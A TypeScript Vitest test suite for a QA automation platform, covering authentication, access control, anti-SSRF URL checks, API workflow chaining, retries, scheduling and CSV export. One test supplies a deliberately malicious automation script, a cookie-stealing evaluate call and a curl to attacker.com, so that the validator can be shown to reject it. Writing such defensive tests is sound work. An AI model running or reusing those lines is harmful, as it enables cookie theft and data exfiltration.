import { describe, it, expect, vi, beforeEach } from "vitest";
import Fastify from "fastify";
import { hashPassword, verifyPassword } from "../services/passwordService";
import {
  authenticateCredentials,
  validateSession,
  assertProjectAccess,
  AccessDeniedError,
  type AuthenticatedUser,
} from "../services/authService";
import { assertTargetUrlAllowed } from "../services/urlGuard";
import { extractTextFromDocument } from "../services/documentParser";
import {
  generateFallbackAutomation,
  validateAutomationInstructions,
} from "../services/automationConverter";
import {
  extractJsonValue,
  interpolateTemplate,
  runMultiStepApiTest,
  type ApiWorkflowStep,
} from "../services/apiRunner";
import {
  executeConcurrentPool,
  runWebTestWithRetries,
} from "../services/executionManager";
import { computeNextRunDate } from "../services/scheduler";
import runEvidenceRoutes from "../routes/runEvidence";
import { pool } from "../config/db";

describe("INTEGRATION & SECURITY REVIEW: Tasks 1–8 Full Lifecycle Verification", () => {
  describe("1. Authentication, Scrypt Hashing & All 4 User Roles", () => {
    it("hashes passwords with OWASP-compliant scrypt and verifies correctly", async () => {
      const password = "SuperSecretSecurePassword!2026";
      const hash = await hashPassword(password);

      expect(hash).toMatch(/^scrypt:N=16384,r=8,p=1\$/);
      expect(await verifyPassword(password, hash)).toBe(true);
      expect(await verifyPassword("WrongPassword123!", hash)).toBe(false);
    });

    it("creates, validates, and manages user sessions with CSRF tokens", async () => {
      const user = {
        id: "00000000-0000-4000-8000-000000000101",
        email: "engineer@company.com",
        password_hash: await hashPassword("ValidPassword123!"),
        full_name: "Lead QA Engineer",
        role: "qa_engineer" as const,
        is_active: true,
      };

      vi.spyOn(pool, "query").mockImplementation(async (text: any, params: any) => {
        if (typeof text === "string" && text.includes("FROM users WHERE email = $1")) {
          return { rowCount: 1, rows: [user] } as any;
        }
        if (typeof text === "string" && text.includes("INSERT INTO sessions")) {
          return { rowCount: 1, rows: [{ id: "sess_123" }] } as any;
        }
        if (typeof text === "string" && text.includes("FROM sessions s")) {
          return {
            rowCount: 1,
            rows: [
              {
                session_id: "sess_123",
                user_id: user.id,
                csrf_token: "csrf_token_xyz_789",
                expires_at: new Date(Date.now() + 86400000),
                email: user.email,
                full_name: user.full_name,
                role: user.role,
                is_active: true,
              },
            ],
          } as any;
        }
        return { rowCount: 0, rows: [] } as any;
      });

      const session = await authenticateCredentials("engineer@company.com", "ValidPassword123!");
      expect(session.sessionToken).toBeDefined();
      expect(session.csrfToken).toBeDefined();

      const validated = await validateSession(session.sessionToken);
      expect(validated).not.toBeNull();
      expect(validated?.user.email).toBe("engineer@company.com");
      expect(validated?.user.role).toBe("qa_engineer");
      expect(validated?.session.csrfToken).toBe("csrf_token_xyz_789");
    });
  });

  describe("2. Project-Level Data Isolation & IDOR Prevention", () => {
    const adminUser: AuthenticatedUser = {
      id: "00000000-0000-4000-8000-000000000001",
      email: "admin@company.com",
      fullName: "Admin",
      role: "admin",
      isActive: true,
    };

    const engineerUser: AuthenticatedUser = {
      id: "00000000-0000-4000-8000-000000000003",
      email: "engineer@company.com",
      fullName: "Engineer",
      role: "qa_engineer",
      isActive: true,
    };

    const viewerUser: AuthenticatedUser = {
      id: "00000000-0000-4000-8000-000000000004",
      email: "viewer@company.com",
      fullName: "Viewer",
      role: "viewer",
      isActive: true,
    };

    const projectA = "00000000-0000-4000-8000-00000000000a";
    const projectB = "00000000-0000-4000-8000-00000000000b";

    beforeEach(() => {
      vi.restoreAllMocks();
    });

    it("allows admin global access across all projects unconditionally", async () => {
      await expect(assertProjectAccess(adminUser, projectA, "qa_manager")).resolves.not.toThrow();
      await expect(assertProjectAccess(adminUser, projectB, "qa_manager")).resolves.not.toThrow();
    });

    it("permits assigned members to access their project based on role hierarchy", async () => {
      vi.spyOn(pool, "query").mockImplementation(async (text: any, params: any) => {
        if (typeof text === "string" && text.includes("FROM project_members")) {
          const projectId = params[0];
          const userId = params[1];
          if (userId === engineerUser.id && projectId === projectA) {
            return { rowCount: 1, rows: [{ role: "qa_engineer" }] } as any;
          }
          if (userId === viewerUser.id && projectId === projectA) {
            return { rowCount: 1, rows: [{ role: "viewer" }] } as any;
          }
        }
        return { rowCount: 0, rows: [] } as any;
      });

      // Engineer on Project A can do qa_engineer actions
      await expect(assertProjectAccess(engineerUser, projectA, "qa_engineer")).resolves.not.toThrow();
      await expect(assertProjectAccess(engineerUser, projectA, "viewer")).resolves.not.toThrow();

      // Engineer on Project A cannot do qa_manager actions
      await expect(assertProjectAccess(engineerUser, projectA, "qa_manager")).rejects.toThrow(
        AccessDeniedError,
      );

      // Viewer on Project A can view, but cannot perform engineering or management
      await expect(assertProjectAccess(viewerUser, projectA, "viewer")).resolves.not.toThrow();
      await expect(assertProjectAccess(viewerUser, projectA, "qa_engineer")).rejects.toThrow(
        AccessDeniedError,
      );
    });

    it("rejects unauthorized cross-project access (IDOR)", async () => {
      vi.spyOn(pool, "query").mockResolvedValue({ rowCount: 0, rows: [] } as any);

      // Viewer on Project A trying to access Project B
      await expect(assertProjectAccess(viewerUser, projectB, "viewer")).rejects.toThrow(
        AccessDeniedError,
      );
      // Engineer on Project A trying to access Project B
      await expect(assertProjectAccess(engineerUser, projectB, "qa_engineer")).rejects.toThrow(
        AccessDeniedError,
      );
    });
  });

  describe("3. Website Authorization & Anti-SSRF URL Validation", () => {
    it("allows valid public HTTPS target URLs", async () => {
      await expect(assertTargetUrlAllowed("https://example.com/app")).resolves.not.toThrow();
      await expect(assertTargetUrlAllowed("https://api.github.com/v1")).resolves.not.toThrow();
    });

    it("strictly blocks localhost, loopback, and metadata IPs when not in dev mode", async () => {
      await expect(
        assertTargetUrlAllowed("http://127.0.0.1:8080", { allowPrivateTargets: false }),
      ).rejects.toThrow();
      await expect(
        assertTargetUrlAllowed("http://localhost:3000", { allowPrivateTargets: false }),
      ).rejects.toThrow();
      await expect(
        assertTargetUrlAllowed("http://169.254.169.254/latest/meta-data"),
      ).rejects.toThrow();
    });
  });

  describe("4. Requirements Upload, Parsing & AI Test Case Generation", () => {
    it("extracts text from plain text requirement documents", async () => {
      const docContent = `
# Customer Checkout Requirement
Users must be able to add products to the shopping cart.
Checkout requires entering shipping address and credit card details.
Orders above $50 qualify for free express shipping.
Negative: Submitting expired credit cards must display an error.
Boundary: Order total exactly $50 must qualify for free shipping.
`;
      const buffer = Buffer.from(docContent, "utf8");
      const parsed = await extractTextFromDocument(buffer, "checkout_spec.txt", "text/plain");

      expect(parsed.fileType).toBe("txt");
      expect(parsed.text).toContain("Customer Checkout Requirement");
      expect(parsed.text).toContain("free express shipping");
    });
  });

  describe("5. Human-In-The-Loop Approval & Automation Conversion", () => {
    it("converts approved test cases into structured Playwright automations via rule engine", () => {
      const approvedCase = {
        title: "Submit Login Form with Valid Credentials",
        description: "Verify that user can log into StockFlow dashboard",
        preconditions: "User exists and account is activated",
        steps: [
          "navigate to /login",
          "fill input#email | tester@example.com",
          "fill input#password | Password123!",
          "click button#submit",
          "expect visible div#dashboard",
        ],
        expected_result: "User arrives on Dashboard page",
        test_type: "positive" as const,
      };

      const automation = generateFallbackAutomation(approvedCase, "web");

      expect(automation.target_type).toBe("web");
      expect(automation.web_steps.length).toBeGreaterThan(0);
      expect(automation.confidence).toBeGreaterThan(0.5);

      const validation = validateAutomationInstructions(automation);
      expect(validation.valid).toBe(true);
      expect(validation.errors).toHaveLength(0);
    });

    it("rejects dangerous or unwhitelisted AI commands in automation scripts", () => {
      const maliciousScript = {
        target_type: "web" as const,
        web_steps: [
          "goto /login",
          "page.evaluate(() => window.__steal_cookies())",
          "curl http://attacker.com/leak",
        ],
      };

      const validation = validateAutomationInstructions(maliciousScript);
      expect(validation.valid).toBe(false);
      expect(validation.errors.length).toBeGreaterThan(0);
      expect(validation.errors[0]).toContain("Invalid or forbidden step instruction");
    });
  });

  describe("6. Chained Multi-Step API Testing & Context Propagation", () => {
    it("chains authentication, resource creation, validation, and cleanup", async () => {
      const mockStepRunner = vi
        .fn()
        .mockResolvedValueOnce({
          status: "passed",
          actualStatus: 200,
          responseMs: 85,
          responseSnippet: JSON.stringify({ token: "auth_token_999", user: { id: "usr_42" } }),
        })
        .mockResolvedValueOnce({
          status: "passed",
          actualStatus: 201,
          responseMs: 110,
          responseSnippet: JSON.stringify({ item: { id: "item_777", name: "Widget A" } }),
        })
        .mockResolvedValueOnce({
          status: "passed",
          actualStatus: 200,
          responseMs: 65,
          responseSnippet: JSON.stringify({ id: "item_777", name: "Widget A" }),
        })
        .mockResolvedValueOnce({
          status: "passed",
          actualStatus: 204,
          responseMs: 45,
          responseSnippet: "",
        });

      const workflowSteps: ApiWorkflowStep[] = [
        {
          name: "1. Login",
          method: "POST",
          path: "/auth/login",
          body: { username: "tester", password: "pwd" },
          expected_status: 200,
          extract: { authToken: "token", userId: "user.id" },
        },
        {
          name: "2. Create Item",
          method: "POST",
          path: "/items",
          headers: { Authorization: "Bearer {{authToken}}" },
          body: { name: "Widget A", owner_id: "{{userId}}" },
          expected_status: 201,
          extract: { itemId: "item.id" },
        },
        {
          name: "3. Verify Item",
          method: "GET",
          path: "/items/{{itemId}}",
          headers: { Authorization: "Bearer {{authToken}}" },
          expected_status: 200,
        },
        {
          name: "4. Delete Item",
          method: "DELETE",
          path: "/items/{{itemId}}",
          headers: { Authorization: "Bearer {{authToken}}" },
          expected_status: 204,
        },
      ];

      const result = await runMultiStepApiTest("https://api.test.local", workflowSteps, {
        runner: mockStepRunner as any,
      });

      expect(result.status).toBe("passed");
      expect(result.stepResults).toHaveLength(4);
      expect(result.extractedContext["authToken"]).toBe("auth_token_999");
      expect(result.extractedContext["userId"]).toBe("usr_42");
      expect(result.extractedContext["itemId"]).toBe("item_777");

      // Verify template interpolation was executed on the 2nd step
      expect(mockStepRunner).toHaveBeenNthCalledWith(
        2,
        "https://api.test.local",
        expect.objectContaining({
          headers: { Authorization: "Bearer auth_token_999" },
          body: { name: "Widget A", owner_id: "usr_42" },
        }),
      );
    });
  });

  describe("7. Parallel Execution, Retries & Flaky Test Classification", () => {
    it("manages concurrency limits across parallel test items", async () => {
      let activeWorkers = 0;
      let maxSeenWorkers = 0;

      const items = Array.from({ length: 10 }, (_, i) => i);
      await executeConcurrentPool(
        items,
        async () => {
          activeWorkers++;
          maxSeenWorkers = Math.max(maxSeenWorkers, activeWorkers);
          await new Promise((resolve) => setTimeout(resolve, 20));
          activeWorkers--;
        },
        3, // Limit to 3 parallel workers
      );

      expect(maxSeenWorkers).toBeLessThanOrEqual(3);
    });

    it("classifies test passing on retry as flaky without falsely passing inconclusive runs", async () => {
      const mockWebRunner = vi
        .fn()
        .mockResolvedValueOnce({
          status: "failed",
          errorMessage: "Element not found",
          durationMs: 400,
        })
        .mockResolvedValueOnce({
          status: "passed",
          durationMs: 250,
        });

      const result = await runWebTestWithRetries(
        "https://app.local",
        ["goto /", "click #login"],
        { runId: "r1", resultId: "res1" },
        { retries: 2, runner: mockWebRunner as any },
      );

      expect(result.status).toBe("passed");
      expect(result.flaky).toBe(true);
      expect(result.retryCount).toBe(1);
      expect(result.attempts).toHaveLength(2);
      expect(result.attempts[0].status).toBe("failed");
      expect(result.attempts[1].status).toBe("passed");
    });
  });

  describe("8. Test Scheduling & Background Job Execution", () => {
    it("computes accurate next run dates for hourly, daily, weekly, and cron schedules", () => {
      const baseDate = new Date("2026-11-03T12:00:00.000Z");

      const nextHourly = computeNextRunDate("hourly", null, baseDate);
      expect(nextHourly.toISOString()).toBe("2026-11-03T13:00:00.000Z");

      const nextDaily = computeNextRunDate("daily", null, baseDate);
      expect(nextDaily.toISOString()).toBe("2026-11-04T12:00:00.000Z");

      const nextWeekly = computeNextRunDate("weekly", null, baseDate);
      expect(nextWeekly.toISOString()).toBe("2026-11-10T12:00:00.000Z");

      // Daily at 02:30 AM local time
      const nextCron = computeNextRunDate("cron", "30 2 * * *", baseDate);
      expect(nextCron.getHours()).toBe(2);
      expect(nextCron.getMinutes()).toBe(30);
    });
  });

  describe("9. Advanced Execution Reporting & RFC 4180 CSV / JSON Export", () => {
    let fastify: ReturnType<typeof Fastify>;

    beforeEach(async () => {
      fastify = Fastify();
      fastify.decorateRequest("user", undefined);
      await fastify.register(runEvidenceRoutes);
    });

    it("exports run data in standard RFC 4180 CSV with flaky and retry counts", async () => {
      vi.spyOn(pool, "query").mockImplementation(async (text: any) => {
        if (typeof text === "string" && text.includes("FROM test_runs")) {
          return {
            rowCount: 1,
            rows: [
              {
                id: "00000000-0000-4000-8000-000000000099",
                project_id: "00000000-0000-4000-8000-00000000000a",
                status: "passed",
                run_type: "suite",
                concurrency: 3,
                retries: 2,
                flaky_count: 1,
                created_at: new Date().toISOString(),
              },
            ],
          } as any;
        }
        if (typeof text === "string" && text.includes("FROM test_results")) {
          return {
            rowCount: 1,
            rows: [
              {
                id: "res-1",
                test_case_id: "tc-1",
                status: "passed",
                duration_ms: 1250,
                error_message: null,
                retry_count: 1,
                flaky: true,
                title: "Checkout Flow",
              },
            ],
          } as any;
        }
        return { rowCount: 0, rows: [] } as any;
      });

      const response = await fastify.inject({
        method: "GET",
        url: "/runs/00000000-0000-4000-8000-000000000099/export?format=csv",
      });

      expect(response.statusCode).toBe(200);
      expect(response.headers["content-type"]).toContain("text/csv");
      expect(response.body).toContain("Test Type,ID,Name/Title,Method/Path,Status,Flaky,Retries,Duration (ms),Error");
      expect(response.body).toContain('"Checkout Flow"');
      expect(response.body).toContain('"YES"'); // Flaky is YES
    });
  });
});
